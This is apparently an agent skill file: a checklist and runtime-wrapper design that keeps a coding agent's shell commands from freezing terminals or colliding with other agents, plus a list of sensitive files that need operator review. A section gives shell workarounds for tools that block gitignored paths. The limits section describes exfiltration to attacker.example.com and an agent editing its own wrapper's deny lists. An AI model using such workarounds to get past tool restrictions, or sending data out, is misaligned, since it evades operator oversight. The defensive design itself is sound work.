---
name: break-check
description: Pre-flight checklist that catches the dozen shapes of terminal freeze, approval-dialog miss, and cross-agent collision before they happen. ALWAYS invoke before composing any run_command tool call that involves git commit, heredoc, multi-line strings, backticks inside quotes, parallel agents, or background processes. Triggers on phrases like "terminal freezing", "stuck in dquote", "commit not running", "approval dialog never appeared", "multiple agents", "isolated terminal", or any complex shell invocation longer than one logical line.
metadata:
  author: weijia-89
  version: "1.0.0"
---
# break-check, Iron Law (always_on)

Check the break before paddling out. Every freeze, every missed approval
dialog, every cross-agent collision falls into one of about a dozen
shapes you can audit a `run_command` line against in two passes before
the line ever lands. Reject if any Tier-1 trips. Tier-2 if Tier-1 passed
but the shell still froze. Promote Tier-2 → Tier-1 after the same shape
bites a second time.

## Tier 1: REJECT

**Syntax:**
1. Newlines in CommandLine → `write_to_file` + `bash /tmp/<task>.sh`
   - Named offenders (most-common first):
     - `git commit -m "<multi-line body>"` → `write_to_file` `/tmp/<repo>_commit_msg.txt` + `git commit -F /tmp/<repo>_commit_msg.txt`
     - `gh pr create --body "<multi-line>"` / `gh issue create --body "<multi-line>"` → `--body-file /tmp/<repo>_pr_body.txt`
     - `echo -e "...\n..."` / `printf "...\n..."` → `write_to_file` then `cat`
     - `python3 -c "<embedded newlines>"` (also `node -e`, `ruby -e`, `perl -e`, etc.) → `write_to_file` `/tmp/inspect_<task>.py` then invoke as single-line `python3 /tmp/inspect_<task>.py`. Cross-references clause #5; the threshold for clause #5 is char count (>200), the threshold here is any embedded `\n`.
     - Any `-m`/`--message`/`--body`/`--description` flag with `\n` or a literal newline in its arg
2. Heredoc (`<<EOF`, `<<'PY'`) → `write_to_file`
3. Backticks inside `"…"` → single quotes or `$(…)`
4. `cd /path && cmd` → use the agent's working-directory parameter (`Cwd`, `cwd`, equivalent) instead of inlining `cd`
5. `python3 -c "…"` >200 chars → `write_to_file` a `.py`
   - Same rule applies to **docs, cheatsheets, READMEs, runbooks** that instruct a human to paste a multi-line `python3 -c '…'` or heredoc into their shell. The hazard is identical to an agent composing it (`dquote>` / partial-paste / shell-state). Ship a real `.py` or `.sh` in the kit and have the doc invoke it as a single-line command.

**Shape:**
6. Test/build with no timeout → add `--timeout 30s` or framework equivalent (`pytest-timeout`, `jest --testTimeout=30000`, `cargo` env var)
7. Foreground watcher/follow (`flutter run`, `npm run dev`, `tail -f`, `*logs -f`, `docker compose up` without `-d`) → detach (`nohup … & disown` + log); poll with `tail -n N`
8. Interactive editor (`git commit` no `-m`/`-F`, `git rebase -i`, `git rebase --continue`/`--amend`/`--edit-todo`, `git commit --amend` no `-m`/`-F`, `vim`, `crontab -e`) → use `-F /tmp/msg.txt` (preferred for any body >1 line) or `-m '<single line>'`; for any `git rebase --continue`/`--amend`/`--edit-todo` or `git commit --amend` without `-m`/`-F`, prefix with `GIT_EDITOR=true` (or set `-c core.editor=true`) so the editor is a no-op accept. Never `-m "<multi-line>"`; see #1.
9. REPL with no `-c`/script (`python3`, `node`, `psql`, `mysql`, `redis-cli`, `sqlite3`, `mongosh`) → supply `-c '…'` or `< script`
10. Stdin-waiting (`cat`/`read`/`grep`/`xargs` with no input) → supply file/`<<<`/pipe
11. Auth prompt (`sudo` without NOPASSWD, `ssh` to an unknown host, `gh`/`aws`/`gcloud`/`docker`/`npm` login, `gpg` without `--batch`) → confirm with user, or pass `-o StrictHostKeyChecking=accept-new` / `--batch`
12. `Blocking: true` paired with a `WaitMsBeforeAsync` value outside the 3000–5000 ms band → use 3000–5000 ms for 30 s to 2 min; else `Blocking: false` + 3000 ms or detach via a long-job workflow.

## Tier 2: check if Tier-1 passed but the shell still froze

13. Output bombs: `find /` no scope, `git log` no `-n N`, `npm ls` no `--depth=0`, `docker logs` no `--tail N`, `journalctl` no `-n N`, `cat <huge>`
14. Background daemons forked by `flutter run`/`npm run dev`; kill before respawn
15. Parallel-agent lockfile contention (`build_runner`, `pub get`, `npm install`, `cargo build`, `bundle install`); use git worktrees or serialize
16. `Cwd` to a missing dir; verify if constructed programmatically
17. Pager edge cases; add `--no-pager` if `PAGER=cat` doesn't propagate
18. `export` non-persistence; each `run_command` is a fresh shell, use an env prefix instead
19. Path quoting around spaces; quote the whole arg

## Allowed and Banned

**Allowed:** Single pipelines (`cmd1 | cmd2 | cmd3`). Single redirect (`cmd > file`). Single guard (`test -f X && cat X` or `cmd1 && cmd2` where `cmd1` is a precondition for `cmd2`). `python3 -c '…'` ≤200 chars, single statement, no embedded newlines. `mv a b c dest/`. The agent's working-directory parameter. `bash /tmp/<task>.sh`. `Blocking: true` + 3000-5000 ms for 30 s to 2 min. Long-job detach for >2 min. Tests with `--timeout 30s`.

**Banned:** `&&` / `;` / `||` between distinct operations is multi-statement, not "single line". Write a script via `write_to_file` and invoke `bash /tmp/<task>.sh`, or split into parallel `run_command` calls. The single-guard exception above is the only allowed `&&` shape. `;` and `||` always trigger chain-proposal regardless of count.

## Gitignored-file access

The `read_file` and `edit` tools may block gitignored paths in some
agents. Workarounds:

- READ: `sed -n "L1,L2p" /path` or `grep -n PATTERN /path` via the shell
- WRITE/MODIFY: `write_to_file` a python script to
  `/tmp/update_<task>.py` (make it idempotent: check for a unique marker
  before insert), then run `python3 /tmp/update_<task>.py`. Never
  heredoc to the gitignored file.

## Workspace-trust file allergens (Layer 0 advisory)

Some files load as instructions, source at shell start, get executed by
humans or CI, or hold identity material. A write to one of these crosses
the agent/operator boundary at a later time the wrapper does not see.
Pause and surface to the operator before any write to:

- `~/.gitconfig`, any `.git/config`
- `.git/hooks/*`
- `Makefile`, `package.json` `scripts:`, `pyproject.toml` build hooks
- `.github/workflows/*`, `.gitlab-ci.yml`, `Jenkinsfile`, `.circleci/config.yml`
- `~/.zshrc`, `~/.bashrc`, `~/.profile`, `~/.env`, `~/.zshenv`
- Agent rule and skill paths (`~/.windsurf/rules/*`,
  `~/.claude/skills/*`, `~/.cursor/rules/*`)
- `~/.vscode/*`, `.vscode/tasks.json`
- `~/.ssh/*` (always; no writes ever)
- The wrapper itself and its allow/deny lists (closed-loop hazard)

This is advisory only. The actual gate is the chat transcript: the
operator reviews the agent's intent before the write lands. A runtime
sentinel that audits these paths after the fact is a reasonable
follow-on; the reference implementation hooks it in but leaves the audit
logic optional.

## Recovery if the terminal freezes

The operator sees `dquote>` / `heredoc>` / `cmdand>` / `quote>`:
1. Press Ctrl-C twice (third time close the window).
2. Do not paste before the unstick.
3. The agent's `run_command` shell is separate from the operator's
   interactive shell. The agent cannot fix the stuck interactive shell
   from inside a `run_command`.

## Self-check after a freeze or audit-fail

The agent's next turn states: (1) the pattern that fired, (2) the
numbered Tier-1 / Tier-2 clause that named it, (3) the new strategy and
why this shape cannot recur.

## Wrapper: the runtime gate

The skill body alone is a discipline; pairing it with a runtime wrapper
turns the discipline into a mechanical gate. The reference
implementation `safe-cmd.sh` ships at
[github.com/weijia-89/safe-terminal](https://github.com/weijia-89/safe-terminal)
under `scripts/`, and operators adapt the paths to their environment.

The wrapper layers (in order, exit non-zero on failure):

- **Layer 2** audits heredoc / embedded-newline / cd-chain → exit 125 with a `fix=` field rewrite suggestion.
- **Layer 2.5** matches against a deny-list (one ERE regex per line) → reject with the rule excerpt.
- **Layer 3** matches against an allowlist (one ERE regex per line) → execute and log on match.
- **Layer 4** audits chain separators. Single `&&` (single-guard idiom) is allowed. Any `;`, any `||`, or two-plus total separators triggers exit 126 with a proposal file the operator must approve before retry.
- **Layer 5 (advisory)** post-execution sentinel scanning for writes to the workspace-trust file allergens listed above. Emits a warning to a sentinel log when triggered; the operator catches escapes in the chat transcript.

Exit codes the wrapper emits:

| Code | Meaning | Recovery |
|---|---|---|
| 0 | underlying command succeeded | continue |
| 1-99 | underlying command failed | read the meta + log, fix the underlying error |
| 124 | timeout (SIGKILL after the configured limit) | read the log tail, pick a faster strategy or detach via a long-job workflow |
| 125 | Layer 2 audit failed | apply the `fix=` field rewrite from the per-PID meta file |
| 126 | Layer 4 chain proposal | read the proposal file, surface the command + reason to the operator, wait for explicit approval before retry |

**Always wrap.** Every `run_command` invocation goes through the
wrapper. The only exceptions are the wrapper invocation itself
(recursion avoidance) and agent-native tool calls that do not reach a
shell (`read_file`, `grep_search`, `find_by_name`, `edit`,
`write_to_file`, `view_file`, `list_dir`). A command that feels too
small to wrap is exactly the case where the rationalization surface is
appearing; wrap it anyway.

## Known incident patterns

Patterns that promoted from Tier-2 to Tier-1 after a second incident in
real use:

- `WaitMsBeforeAsync` outside the 3000-5000 ms band, promoted to #12.
- Tests without `--timeout`, promoted to #6 after a 50-minute hang.
- `git commit -m "<multi-line>"`, sub-pattern of #1.
- Cheatsheets shipping a multi-line `python3 -c '…'` for a human to
  paste, sub-pattern of #5 in its "docs and runbooks" form.
- `git rebase --continue` without `GIT_EDITOR=true`, sub-pattern of #8;
  recovery is the `GIT_EDITOR=true` prefix.
- Skip-wrapper rationalization (the agent argues a command is too small
  to wrap, then composes a multi-statement chain on the next turn). The
  fix is to remove the skip-wrapper exception list entirely; the wrap
  is mandatory.

## Known limits (residual risk classes)

Mitigation, not closure. Three classes are explicitly out of scope:

1. **Network-egress plane is absent.** No layer gates outbound
   HTTP/DNS/TCP. A `/tmp/*.py` script that exfiltrates via
   `requests.post(attacker.example.com, data=…)` runs unimpeded under
   the script-execution allowlist patterns. A separate scope.
2. **Agent-writes-then-human-commits-to-CI chain.** Layer 5 catches
   agent-mediated execution chains. A modified `.github/workflows/*.yml`
   that the human later commits and pushes outside the agent's session
   is gated only by the operator's PR review, not by anything this skill
   enforces.
3. **Closed-loop on the wrapper itself.** If the agent modifies the
   wrapper or its allow/deny lists, every future invocation runs
   whatever the modification does. The structural fix is sandbox
   containment, which requires IDE-architecture changes the skill cannot
   reach.
